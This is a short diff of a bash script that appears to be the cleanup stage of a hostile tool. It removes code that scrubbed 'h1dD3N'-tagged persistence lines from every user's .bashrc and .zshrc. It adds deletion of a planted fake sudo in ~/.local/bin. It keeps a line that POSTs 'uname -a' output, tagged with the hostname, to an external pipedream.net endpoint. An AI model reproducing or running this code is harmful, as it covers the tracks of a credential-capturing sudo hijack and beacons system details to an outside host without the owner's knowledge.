@@ -1,16 +1,6 @@
 #!/bin/bash
 
-function uninstall_in_rc() {
-    if ! [ -f "$1" ]; then
-        return
-    fi
-    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && cat "$1.h1dD3Nbak" > "$1" && rm "$1.h1dD3Nbak"
-}
-
-for user in `find /home/ -maxdepth 1 -type d`; do
-    uninstall_in_rc "$user/.bashrc"
-    uninstall_in_rc "$user/.zshrc"
-done
+rm -rf ~/.local/bin/sudo
 
 uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root_$(uname -n) -X POST -d "$(</dev/stdin)"
 
